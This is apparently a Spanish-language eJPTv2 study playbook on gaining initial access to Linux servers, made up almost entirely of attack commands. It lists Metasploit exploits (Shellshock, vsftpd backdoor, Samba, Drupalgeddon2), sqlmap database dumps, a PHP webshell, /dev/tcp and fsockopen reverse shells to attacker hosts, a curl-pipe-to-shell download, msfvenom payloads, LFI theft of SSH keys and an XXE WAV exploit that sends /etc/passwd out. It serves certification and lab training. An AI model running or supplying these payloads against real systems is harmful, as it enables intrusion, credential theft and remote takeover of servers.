# 💥 PLAYBOOK 5 — FOOTHOLD: EXPLOTACIÓN LINUX

> **Objetivo:** Obtener acceso inicial a servidores Linux mediante vulnerabilidades conocidas y ataques web.
> **Fuente:** Guia_eJPTv2_TFM — Carpetas 04/Linux, 05, 09

---

## 5.1 — Vulnerabilidades Conocidas Linux

### 5.1.1 Shellshock (Apache 2.4.6 + Bash)
```bash
# Detección
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>

# MSF — Exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET_IP>
set TARGETURI /gettime.cgi
exploit
```

### 5.1.2 vsftpd 2.3.4 — Backdoor FTP
```bash
# MSF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <TARGET_IP>
run
/bin/bash -i

# Manual
searchsploit vsftpd
searchsploit -m 49757
python3 49757.py <TARGET_IP>
```

### 5.1.3 Samba 3.x-4.x — is_known_pipename
```bash
use exploit/linux/samba/is_known_pipename
set RHOSTS <TARGET_IP>
run
```

### 5.1.4 Samba 3.0.20 — usermap_script
```bash
# Detección
searchsploit samba 3.0.20
nmap -sV -p 445 <TARGET_IP>

# MSF
use auxiliary/scanner/smb/smb_version
setg RHOSTS <TARGET_IP>
run

use exploit/multi/samba/usermap_script
run
background
sessions -u 1        # Upgrade a meterpreter
sessions 2
```

### 5.1.5 SSH libssh 0.6.0-0.8.0 — Auth Bypass
```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <TARGET_IP>
set SPAWN_PTY true
run
sessions 1
```

### 5.1.6 ProFTPd 1.3.3
```bash
searchsploit ProFTPD
```

### 5.1.7 Haraka SMTP (SNMP 2.8.8)
```bash
use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST <LHOST>
set LPORT 8080
run
```

### 5.1.8 PHP 5.2.4 CGI
```bash
nmap -sV -sC -p 80 <TARGET_IP>
searchsploit php cgi
searchsploit -m 18836
python2 18836.py <TARGET_IP> 80

# Modificar para reverse shell
# pwn_code = """<?php $sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&4 >&4 2>&4");?>"""
nc -nvlp <PORT>
python2 18836.py <TARGET_IP> 80
```

---

## 5.2 — Ataques Web

### 5.2.1 SQL Injection — SQLmap
```bash
# Verificar inyección + listar bases de datos
sqlmap -u http://<TARGET_IP>/administrator/ --forms --dbs --batch

# Enumerar tablas
sqlmap -u http://<TARGET_IP>/administrator/ --forms -D <DB_NAME> --tables --batch

# Enumerar columnas
sqlmap -u http://<TARGET_IP>/administrator/ --forms -D <DB_NAME> -T <TABLE> --columns --batch

# Dump de datos
sqlmap -u http://<TARGET_IP>/administrator/ --forms -D <DB_NAME> -T <TABLE> -C username,password --dump --batch
```

### SQLi Manual
```bash
' OR 1=1;-- -
```

### 5.2.2 File Upload — Reverse Shell PHP
```bash
# Crear payload
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=443 -f raw > pwned.php

# Encontrar directorio de uploads con fuzzing
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

# Subir archivo y ponerse en escucha
nc -nlvp 443
# Navegar a http://<TARGET_IP>/uploads/pwned.php

# Reverse shell estable
nc -nlvp 4444
bash -c "sh -i >& /dev/tcp/<LHOST>/4444 0>&1"
```

### 5.2.3 Bypass File Upload — Extensiones alternativas
```bash
mv pwned.php pwned.phtml
cp shell.php shell.phar
cp shell.php shell.php5
```
> Extensiones a probar: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`
> Usar **BurpSuite Intruder** con Sniper para probar extensiones automáticamente.

### 5.2.4 Webshell manual
```bash
nano webshell.php
```
```php
<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
```
```bash
# Ejecutar: http://<TARGET_IP>/uploads/webshell.php?cmd=whoami
# Para reverse shell, URL-encodear con BurpSuite Decoder:
bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"
nc -nlvp 443
```

### 5.2.5 Tomcat — WAR File Upload
```bash
# Payload WAR
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f war -o reverse.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f war -o reverse2.war

# Subir en Manager WebApp (/manager/html)
# Credenciales por defecto: tomcat:s3cret, admin:admin, tomcat:tomcat
nc -nlvp 443
# Navegar a http://<TARGET_IP>:8080/reverse2/
```

### 5.2.6 LFI — Local File Inclusion
```bash
# Leer /etc/passwd
http://<TARGET_IP>/page.php?doc=../../etc/passwd
curl http://<TARGET_IP>/index.php?referer=..//..//..//..//etc/passwd

# Buscar claves SSH
http://<TARGET_IP>/page.php?doc=../../home/<USER>/.ssh/id_rsa

# Usar id_rsa encontrada
nano id_rsa    # Pegar contenido
chmod 600 id_rsa
ssh -i id_rsa <USER>@<TARGET_IP>

# Si pide passphrase, crackear:
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### 5.2.7 DNS Zone Transfer Attack
```bash
dig axfr <DOMAIN> @<DNS_SERVER_IP>
# Añadir subdominios encontrados a /etc/hosts
```

---

## 5.3 — CMS — WordPress

### Enumeración
```bash
wpscan --url http://<TARGET_IP>/blog --enumerate u,vp
```

### Fuerza bruta
```bash
wpscan --url http://<TARGET_IP>/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

### RCE via Theme Editor
```bash
# 1. Crear payload PHP
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=443 -f raw > pwned.php
cat pwned.php

# 2. Pegar contenido en Appearance → Theme Editor → Theme Footer (footer.php)
# 3. Escuchar
nc -nlvp 443
# 4. Navegar a la página principal del blog para activar el footer

# Reverse shell estable
nc -nlvp 444
bash -c "sh -i >& /dev/tcp/<LHOST>/444 0>&1"
```

### CVE-2021-29447 (XXE via WAV)
```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"? <!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://<LHOST>:<LPORT>/archivo.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

# Crear archivo.dtd
nano archivo.dtd
# <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
# <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://<LHOST>:<LPORT>/?p=%file;'>">

php -S <LHOST>:<LPORT>
# Subir payload.wav a WordPress Media → Decodificar base64 recibido
echo "<BASE64>" | base64 -d
```

---

## 5.4 — CMS — Drupal

```bash
# Detección
dirb http://<TARGET_IP>

# MSF — Drupalgeddon2
msfconsole
search drupalgeddon
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <TARGET_IP>
set TARGETURI /drupal/
run

# Post — buscar credenciales
find / -name settings.php 2>/dev/null
cat /var/www/html/sites/default/settings.php
```

---

## 5.5 — Payloads msfvenom (Linux)

```bash
# Linux 32bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > payload

# Linux 64bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o payload.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php

# Java WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# Encoded
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -i 10 -e x86/shikata_ga_nai -f elf > payload_enc
```

---

## 5.6 — Transferencia de archivos (Linux)

```bash
# Atacante — Servir
python3 -m http.server 80

# Víctima — Descargar
wget http://<ATTACKER_IP>/archivo -O nombre
curl http://<ATTACKER_IP>/archivo -o nombre
curl -L http://<ATTACKER_IP>/archivo | sh        # Ejecutar en memoria
```

---

## 5.7 — TTY Treatment (Post-acceso)

```bash
script /dev/null -c bash
# Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty -a                   # En NUESTRA terminal, ver rows y columns
stty rows <N> columns <N>

# Alternativa Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```
